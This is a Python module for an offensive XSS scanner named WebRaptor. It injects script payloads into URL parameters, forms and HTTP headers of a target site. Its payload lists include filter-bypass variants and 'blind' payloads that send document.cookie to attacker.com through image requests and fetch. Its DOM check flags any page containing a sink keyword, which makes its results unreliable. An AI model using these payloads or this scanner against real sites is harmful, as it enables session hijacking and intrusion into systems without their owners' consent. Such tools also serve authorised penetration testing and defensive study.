
import re
import time
import random
import urllib.parse
from colorama import Fore, Style
from core.engine import make_request
from core.config import Config

# Module metadata
description = "Advanced XSS vulnerability scanner with multiple attack vectors"
author = "LakshmikanthanK (@letchu_pkt)"
version = "2.1"

class WebRaptorXSSScanner:
    def __init__(self, config=None):
        self.config = config or Config()
        self.timeout = 10
        self.delay = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        self.scan_methods = {
            'reflected': True,
            'dom': True,
            'stored': False,
            'blind': True
        }
        self.test_forms = True
        self.test_cookies = True
        self.test_headers = True
        self.custom_payloads = []
        self.results = []
        self.start_time = None
        self.requests_made = 0
        
    def show_banner(self):
        """Display module banner"""
        banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║                    {Fore.YELLOW}WebRaptor XSS Scanner v{version}{Fore.RED}                  ║
║            Advanced Cross-Site Scripting Detection           ║
║              Author: LakshmikanthanK (@letchu_pkt)           ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    def show_menu(self):
        """Display interactive configuration menu"""
        while True:
            print(f"\n{Fore.RED}╭─ XSS Scanner Configuration Menu ─╮{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Reflected XSS        : {Fore.GREEN}{'Enabled' if self.scan_methods['reflected'] else 'Disabled'}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}2.{Style.RESET_ALL} DOM-based XSS        : {Fore.GREEN}{'Enabled' if self.scan_methods['dom'] else 'Disabled'}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}3.{Style.RESET_ALL} Stored XSS           : {Fore.GREEN}{'Enabled' if self.scan_methods['stored'] else 'Disabled'}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}4.{Style.RESET_ALL} Blind XSS            : {Fore.GREEN}{'Enabled' if self.scan_methods['blind'] else 'Disabled'}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}5.{Style.RESET_ALL} Test Forms           : {Fore.GREEN}{'Yes' if self.test_forms else 'No'}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}6.{Style.RESET_ALL} Test Cookies         : {Fore.GREEN}{'Yes' if self.test_cookies else 'No'}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}7.{Style.RESET_ALL} Test Headers         : {Fore.GREEN}{'Yes' if self.test_headers else 'No'}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}8.{Style.RESET_ALL} Request Delay        : {Fore.GREEN}{self.delay}s{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}9.{Style.RESET_ALL} Custom Payloads      : {Fore.GREEN}{len(self.custom_payloads)} loaded{Style.RESET_ALL}")
            print(f"{Fore.RED}╰──────────────────────────────────╯{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}s.{Style.RESET_ALL} Start Scanning")
            print(f"{Fore.YELLOW}q.{Style.RESET_ALL} Back to Main Menu")
            
            choice = input(f"{Fore.GREEN}webraptor/xss{Style.RESET_ALL}> ").strip().lower()
            
            if choice == '1':
                self.scan_methods['reflected'] = not self.scan_methods['reflected']
            elif choice == '2':
                self.scan_methods['dom'] = not self.scan_methods['dom']
            elif choice == '3':
                self.scan_methods['stored'] = not self.scan_methods['stored']
                if self.scan_methods['stored']:
                    print(f"{Fore.YELLOW}[!] Warning: Stored XSS testing may leave test data on target{Style.RESET_ALL}")
            elif choice == '4':
                self.scan_methods['blind'] = not self.scan_methods['blind']
            elif choice == '5':
                self.test_forms = not self.test_forms
            elif choice == '6':
                self.test_cookies = not self.test_cookies
            elif choice == '7':
                self.test_headers = not self.test_headers
            elif choice == '8':
                try:
                    self.delay = float(input("Enter delay between requests (0-5 seconds): "))
                    if self.delay < 0 or self.delay > 5:
                        print(f"{Fore.RED}[-] Delay must be between 0 and 5 seconds{Style.RESET_ALL}")
                        self.delay = 0
                except ValueError:
                    print(f"{Fore.RED}[-] Invalid input. Using default: 0{Style.RESET_ALL}")
            elif choice == '9':
                self.load_custom_payloads()
            elif choice == 's':
                return True  # Start scanning
            elif choice == 'q':
                return False  # Back to main menu
    
    def load_custom_payloads(self):
        """Load custom XSS payloads from file"""
        payload_file = input("Enter path to custom payload file (or 'clear' to remove): ").strip()
        
        if payload_file.lower() == 'clear':
            self.custom_payloads = []
            print(f"{Fore.GREEN}[+] Custom payloads cleared{Style.RESET_ALL}")
            return
            
        try:
            with open(payload_file, 'r', encoding='utf-8', errors='ignore') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                self.custom_payloads.extend(payloads)
                print(f"{Fore.GREEN}[+] Loaded {len(payloads)} custom payloads{Style.RESET_ALL}")
        except FileNotFoundError:
            print(f"{Fore.RED}[-] Payload file not found{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading payloads: {e}{Style.RESET_ALL}")
    
    def get_xss_payloads(self, payload_type="basic"):
        """Get XSS payloads based on type"""
        payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<body onload=alert("XSS")>',
                '<div onmouseover=alert("XSS")>hover</div>'
            ],
            'advanced': [
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<img src="x" onerror="alert(\'XSS\')">',
                '<svg/onload=alert(/XSS/)>',
                '<iframe srcdoc="<script>alert(\'XSS\')</script>">',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>'
            ],
            'filter_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<img src=x onerror=\x61lert("XSS")>',
                '"><svg onload=alert`XSS`>',
                '<iframe src=javascript:alert&lpar;\'XSS\'&rpar;>',
                '<img src=x:alert(alt) onerror=eval(src) alt=XSS>',
                '<svg><script>alert&#40;\'XSS\'&#41;</script>',
                '<img src="x" onerror="&#97;lert(&#39;XSS&#39;)">'
            ],
            'dom': [
                'javascript:alert("XSS")',
                '#<script>alert("XSS")</script>',
                'javascript:alert(document.cookie)',
                'data:text/html,<script>alert("XSS")</script>',
                '#"><script>alert("XSS")</script>',
                'javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))'
            ],
            'blind': [
                '<script>var i=new Image();i.src="http://attacker.com/xss?"+document.cookie;</script>',
                '<img src=x onerror=this.src="http://attacker.com/xss?"+document.cookie>',
                '<script>fetch("http://attacker.com/xss?c="+btoa(document.cookie))</script>',
                '<iframe src="javascript:var i=new Image();i.src=\'http://attacker.com/xss?\'+document.cookie"></iframe>'
            ]
        }
        
        result = []
        if payload_type in payloads:
            result.extend(payloads[payload_type])
        
        # Add custom payloads
        result.extend(self.custom_payloads)
        
        return result
    
    def get_random_user_agent(self):
        """Get random user agent"""
        return random.choice(self.user_agents)
    
    def extract_forms(self, html_content, base_url):
        """Extract forms from HTML content"""
        forms = []
        form_pattern = r'<form[^>]*>(.*?)</form>'
        forms_found = re.findall(form_pattern, html_content, re.DOTALL | re.IGNORECASE)
        
        for form_content in forms_found:
            # Extract action
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_content, re.IGNORECASE)
            action = action_match.group(1) if action_match else base_url
            
            # Extract method
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_content, re.IGNORECASE)
            method = method_match.group(1).upper() if method_match else 'GET'
            
            # Extract input fields
            inputs = []
            input_pattern = r'<input[^>]*>'
            input_matches = re.findall(input_pattern, form_content, re.IGNORECASE)
            
            for input_tag in input_matches:
                name_match = re.search(r'name=["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
                type_match = re.search(r'type=["\']([^"\']*)["\']', input_tag, re.IGNORECASE)
                
                if name_match:
                    input_name = name_match.group(1)
                    input_type = type_match.group(1) if type_match else 'text'
                    inputs.append({'name': input_name, 'type': input_type})
            
            forms.append({
                'action': action,
                'method': method,
                'inputs': inputs
            })
        
        return forms
    
    def test_reflected_xss(self, url):
        """Test for reflected XSS vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for Reflected XSS...{Style.RESET_ALL}")
        vulnerabilities = []
        
        if '?' not in url:
            return vulnerabilities
        
        base_url, params = url.split('?', 1)
        param_dict = {}
        
        try:
            for param_pair in params.split('&'):
                if '=' in param_pair:
                    key, value = param_pair.split('=', 1)
                    param_dict[key] = urllib.parse.unquote(value)
        except Exception:
            return vulnerabilities
        
        payloads = self.get_xss_payloads('basic') + self.get_xss_payloads('advanced')
        
        for param_name, original_value in param_dict.items():
            print(f"{Fore.CYAN}[*] Testing parameter: {param_name}{Style.RESET_ALL}")
            
            for payload in payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                # Create test URL
                test_params = param_dict.copy()
                test_params[param_name] = payload
                
                test_url = base_url + '?' + '&'.join([f"{k}={urllib.parse.quote(v)}" for k, v in test_params.items()])
                
                headers = {'User-Agent': self.get_random_user_agent()}
                response = make_request(test_url, headers=headers, timeout=self.timeout)
                self.requests_made += 1
                
                if response and self.check_xss_response(response.text, payload):
                    vuln = {
                        'type': 'Reflected XSS',
                        'parameter': param_name,
                        'payload': payload,
                        'url': test_url,
                        'method': 'GET'
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Fore.RED}[!] REFLECTED XSS FOUND in parameter '{param_name}'{Style.RESET_ALL}")
                    print(f"    Payload: {payload[:50]}...")
                    break  # Move to next parameter
        
        return vulnerabilities
    
    def test_dom_xss(self, url):
        """Test for DOM-based XSS vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing for DOM-based XSS...{Style.RESET_ALL}")
        vulnerabilities = []
        
        dom_payloads = self.get_xss_payloads('dom')
        
        # Test URL fragment
        for payload in dom_payloads:
            if self.delay > 0:
                time.sleep(self.delay)
            
            test_url = f"{url}#{payload}"
            headers = {'User-Agent': self.get_random_user_agent()}
            response = make_request(url, headers=headers, timeout=self.timeout)  # Base URL for DOM
            self.requests_made += 1
            
            if response:
                # Look for JavaScript that processes location.hash, location.search, etc.
                dom_sinks = [
                    'location.hash', 'location.search', 'document.URL',
                    'document.referrer', 'window.name', 'history.pushState',
                    'document.write', 'innerHTML', 'outerHTML'
                ]
                
                for sink in dom_sinks:
                    if sink in response.text:
                        vuln = {
                            'type': 'DOM-based XSS',
                            'sink': sink,
                            'payload': payload,
                            'url': test_url,
                            'method': 'Client-side'
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.RED}[!] POTENTIAL DOM XSS with sink '{sink}'{Style.RESET_ALL}")
                        print(f"    Test URL: {test_url}")
                        break
        
        return vulnerabilities
    
    def test_form_xss(self, url):
        """Test forms for XSS vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing forms for XSS...{Style.RESET_ALL}")
        vulnerabilities = []
        
        # Get the page content first
        headers = {'User-Agent': self.get_random_user_agent()}
        response = make_request(url, headers=headers, timeout=self.timeout)
        self.requests_made += 1
        
        if not response:
            return vulnerabilities
        
        forms = self.extract_forms(response.text, url)
        payloads = self.get_xss_payloads('basic')
        
        for form in forms:
            print(f"{Fore.CYAN}[*] Testing form with action: {form['action']}{Style.RESET_ALL}")
            
            for payload in payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                # Prepare form data
                form_data = {}
                for input_field in form['inputs']:
                    if input_field['type'].lower() not in ['submit', 'button', 'reset']:
                        form_data[input_field['name']] = payload
                
                if not form_data:
                    continue
                
                # Submit form
                form_url = urllib.parse.urljoin(url, form['action'])
                
                if form['method'] == 'POST':
                    test_response = make_request(form_url, method='POST', data=form_data, 
                                               headers=headers, timeout=self.timeout)
                else:
                    # GET method
                    query_string = '&'.join([f"{k}={urllib.parse.quote(str(v))}" for k, v in form_data.items()])
                    test_url = f"{form_url}?{query_string}"
                    test_response = make_request(test_url, headers=headers, timeout=self.timeout)
                
                self.requests_made += 1
                
                if test_response and self.check_xss_response(test_response.text, payload):
                    vuln = {
                        'type': 'Form XSS',
                        'form_action': form['action'],
                        'method': form['method'],
                        'payload': payload,
                        'url': form_url,
                        'fields': list(form_data.keys())
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Fore.RED}[!] FORM XSS FOUND in form '{form['action']}'{Style.RESET_ALL}")
                    print(f"    Method: {form['method']}")
                    print(f"    Fields: {', '.join(form_data.keys())}")
                    break
        
        return vulnerabilities
    
    def test_header_xss(self, url):
        """Test HTTP headers for XSS vulnerabilities"""
        print(f"{Fore.CYAN}[*] Testing HTTP headers for XSS...{Style.RESET_ALL}")
        vulnerabilities = []
        
        header_payloads = self.get_xss_payloads('basic')
        test_headers = [
            'User-Agent', 'Referer', 'X-Forwarded-For',
            'X-Real-IP', 'X-Originating-IP', 'Accept-Language'
        ]
        
        for header_name in test_headers:
            for payload in header_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                headers = {
                    'User-Agent': self.get_random_user_agent(),
                    header_name: payload
                }
                
                response = make_request(url, headers=headers, timeout=self.timeout)
                self.requests_made += 1
                
                if response and self.check_xss_response(response.text, payload):
                    vuln = {
                        'type': 'Header XSS',
                        'header': header_name,
                        'payload': payload,
                        'url': url,
                        'method': 'Header Injection'
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Fore.RED}[!] HEADER XSS FOUND in '{header_name}' header{Style.RESET_ALL}")
                    print(f"    Payload: {payload[:50]}...")
                    break
        
        return vulnerabilities
    
    def check_xss_response(self, response_text, payload):
        """Check if payload is reflected in response without proper encoding"""
        if not response_text or not payload:
            return False
        
        # Simple check: payload appears unescaped
        if payload in response_text:
            return True
        
        # Check for partial matches (common in real scenarios)
        payload_parts = [
            '<script>', '</script>', 'alert(', 'onerror=',
            'onload=', 'javascript:', '<img', '<svg'
        ]
        
        found_parts = 0
        for part in payload_parts:
            if part.lower() in response_text.lower():
                found_parts += 1
        
        # If multiple payload parts are found, likely vulnerable
        return found_parts >= 2
    
    def print_statistics(self):
        """Print scan statistics"""
        elapsed_time = time.time() - self.start_time
        
        print(f"\n{Fore.RED}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] XSS Scan Statistics:{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] Total Requests: {self.requests_made}{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] Vulnerabilities Found: {len(self.results)}{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] Scan Time: {elapsed_time:.2f}s{Style.RESET_ALL}")
        
        # Breakdown by vulnerability type
        vuln_types = {}
        for vuln in self.results:
            vuln_type = vuln['type']
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
        
        if vuln_types:
            print(f"{Fore.RED}[*] Vulnerabilities by Type:{Style.RESET_ALL}")
            for vuln_type, count in vuln_types.items():
                print(f"    {vuln_type}: {count}")
        
        print(f"{Fore.RED}{'='*80}{Style.RESET_ALL}")
    
    def save_results(self):
        """Save results to WebRaptor config and files"""
        if not self.results:
            return
        
        # Save to WebRaptor config
        self.config.add_result('xss', {
            'vulnerabilities': self.results,
            'total_found': len(self.results),
            'scan_time': time.time() - self.start_time,
            'target': self.config.target
        })
        
        # Save detailed results to file
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        output_file = f"xss_results_{timestamp}.txt"
        
        try:
            with open(output_file, 'w') as f:
                f.write(f"WebRaptor XSS Scanner Results\n")
                f.write(f"Target: {self.config.target}\n")
                f.write(f"Scan Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Vulnerabilities: {len(self.results)}\n")
                f.write("="*80 + "\n\n")
                
                for i, vuln in enumerate(self.results, 1):
                    f.write(f"Vulnerability #{i}:\n")
                    f.write(f"Type: {vuln['type']}\n")
                    f.write(f"URL: {vuln['url']}\n")
                    f.write(f"Method: {vuln.get('method', 'N/A')}\n")
                    if 'parameter' in vuln:
                        f.write(f"Parameter: {vuln['parameter']}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    f.write("-" * 40 + "\n\n")
            
            print(f"{Fore.GREEN}[+] Results saved to {output_file}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error saving results: {e}{Style.RESET_ALL}")
    
    def run_scan(self, target):
        """Main scanning function"""
        print(f"\n{Fore.RED}[*] Starting XSS scan on: {target}{Style.RESET_ALL}")
        print(f"{Fore.RED}[*] Scan Configuration:{Style.RESET_ALL}")
        
        enabled_methods = [method for method, enabled in self.scan_methods.items() if enabled]
        print(f"    Methods: {', '.join(enabled_methods)}")
        print(f"    Test Forms: {'Yes' if self.test_forms else 'No'}")
        print(f"    Test Headers: {'Yes' if self.test_headers else 'No'}")
        print(f"    Request Delay: {self.delay}s")
        print(f"{Fore.RED}{'='*80}{Style.RESET_ALL}")
        
        self.start_time = time.time()
        all_vulnerabilities = []
        
        try:
            # Test reflected XSS
            if self.scan_methods['reflected']:
                reflected_vulns = self.test_reflected_xss(target)
                all_vulnerabilities.extend(reflected_vulns)
            
            # Test DOM XSS
            if self.scan_methods['dom']:
                dom_vulns = self.test_dom_xss(target)
                all_vulnerabilities.extend(dom_vulns)
            
            # Test form XSS
            if self.test_forms:
                form_vulns = self.test_form_xss(target)
                all_vulnerabilities.extend(form_vulns)
            
            # Test header XSS
            if self.test_headers:
                header_vulns = self.test_header_xss(target)
                all_vulnerabilities.extend(header_vulns)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
        
        self.results = all_vulnerabilities
        self.print_statistics()
        self.save_results()
        
        if self.results:
            print(f"\n{Fore.RED}[+] XSS scan completed! Found {len(self.results)} vulnerabilities{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Manual verification recommended for all findings{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[+] No XSS vulnerabilities detected{Style.RESET_ALL}")

def run(target):
    """Main entry point for WebRaptor framework"""
    try:
        config = Config()
        scanner = WebRaptorXSSScanner(config)
        
        scanner.show_banner()
        
        # Show interactive menu for configuration
        if scanner.show_menu():
            scanner.run_scan(target)
        else:
            print(f"{Fore.YELLOW}[!] XSS scan cancelled{Style.RESET_ALL}")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Module interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error in XSS scanner module: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    # For standalone testing
    import sys
    if len(sys.argv) > 1:
        run(sys.argv[1])
    else:
        print("Usage: python xss_scanner.py <target_url>")